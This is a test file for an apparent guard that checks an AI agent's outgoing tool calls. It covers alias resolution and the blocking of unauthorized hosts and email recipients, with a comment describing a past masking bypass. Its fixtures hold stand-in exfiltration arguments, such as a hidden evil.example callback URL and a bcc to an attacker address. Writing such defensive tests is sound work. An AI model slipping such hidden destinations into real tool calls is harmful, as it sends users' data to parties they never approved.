import { describe, expect, it } from 'vitest';
import { resolveCanonicalTool, egressContract, normalizeToolKey } from '../src/tool-contracts.js';
import { decideAttribution } from '../src/attribution.js';
import { wrapSpan } from '../src/ingest.js';
import type { Span } from '../src/types.js';

// Regression for the contract-confusion masking bypass (audit follow-up): a
// `/^send_/` heuristic classified `send_http` as an email tool and never
// extracted its URL host, so an authorized host masked an unauthorized one.
// Egress classification now goes through the explicit alias resolver, which
// mirrors the differential tool oracle.

describe('tool-contract resolution', () => {
  it('resolves network aliases to http_post', () => {
    for (const name of ['http_post', 'HTTP-POST', 'send_http', 'sendHttp', 'http_request', 'httprequest', 'post', 'upload', 'webhook', 'httpsend']) {
      expect(resolveCanonicalTool(name)).toBe('http_post');
      expect(egressContract(name)).toBe('network');
    }
  });

  it('resolves email aliases to send_email', () => {
    for (const name of ['send_email', 'SendEmail', 'send-email', 'mail', 'sendmail', 'email', 'emailSend']) {
      expect(resolveCanonicalTool(name)).toBe('send_email');
      expect(egressContract(name)).toBe('email');
    }
  });

  it('never classifies a network alias as an email tool, or vice versa', () => {
    expect(egressContract('send_http')).not.toBe('email');
    expect(egressContract('mail')).not.toBe('network');
  });

  it('returns none for an unknown tool (no positive egress authorization)', () => {
    for (const name of ['send_widgets', 'exfiltrate_now', 'frobnicate', '']) {
      expect(resolveCanonicalTool(name)).toBeNull();
      expect(egressContract(name)).toBe('none');
    }
  });

  it('normalizes tool keys by lowercasing and stripping non-alphanumerics', () => {
    expect(normalizeToolKey('Send-Email')).toBe('sendemail');
    expect(normalizeToolKey('HTTP_POST')).toBe('httppost');
  });
});

function networkSpans(): Span[] {
  return [
    wrapSpan({ origin: 'system', content: 'assistant' }),
    wrapSpan({ origin: 'user-session', content: 'Post the status to https://good.example/x.' }),
    wrapSpan({ origin: 'tool-result', content: 'note' })
  ];
}

function mailSpans(): Span[] {
  return [
    wrapSpan({ origin: 'system', content: 'assistant' }),
    wrapSpan({ origin: 'user-session', content: 'Email the report to alice@corp.example.' }),
    wrapSpan({ origin: 'tool-result', content: 'note' })
  ];
}

describe('egress authorization is robust to tool-name aliasing', () => {
  it('blocks an unauthorized host under any network alias', () => {
    const args = { url: 'https://good.example/x', callback: 'https://evil.example/x' };
    for (const name of ['http_post', 'send_http', 'http_request', 'post', 'upload', 'webhook']) {
      expect(decideAttribution(name, args, {}, networkSpans()).verdict).toBe('block');
    }
  });

  it('blocks an unauthorized host smuggled through an array under a network alias', () => {
    const args = { urls: ['https://good.example/x', 'https://evil.example/x'] };
    expect(decideAttribution('send_http', args, {}, networkSpans()).verdict).toBe('block');
  });

  it('blocks an unauthorized recipient under any email alias', () => {
    const args = { to: 'alice@corp.example', bcc: 'evil@evil.example' };
    for (const name of ['send_email', 'mail', 'sendmail', 'email']) {
      expect(decideAttribution(name, args, {}, mailSpans()).verdict).toBe('block');
    }
  });

  it('does not positively authorize an unknown send_* tool on egress grounds', () => {
    // Unknown send_* is sensitive by name (fail-closed) and carries no positive
    // egress authorization, so it cannot be masked into an allow.
    const decision = decideAttribution('send_widgets', { payload: 'anything' }, {}, mailSpans());
    expect(decision.verdict).toBe('block');
  });
});
